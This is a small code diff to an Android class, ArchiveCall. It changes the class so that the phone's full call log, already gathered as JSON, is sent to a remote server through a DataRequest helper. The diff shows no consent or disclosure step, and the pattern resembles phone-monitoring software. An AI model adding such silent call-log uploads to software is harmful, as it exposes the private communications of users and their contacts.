@@ -11,6 +11,7 @@ import android.util.Log;
 
 import com.inet.android.convertdate.ConvertDate;
 import com.inet.android.db.RequestDataBaseHelper;
+import com.inet.android.request.DataRequest;
 
 public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	Context mContext;
@@ -104,8 +105,12 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 				}
 			}
 			callLogCursor.close();
-			Log.d("JsonCall", AllCallJson.toString());
 
+			if (AllCallJson != null) {
+				DataRequest dr = new DataRequest(mContext);
+				dr.sendRequest(AllCallJson.toString());
+				Log.d("JsonCall", AllCallJson.toString());
+			}
 		}
 		return null;
 	}
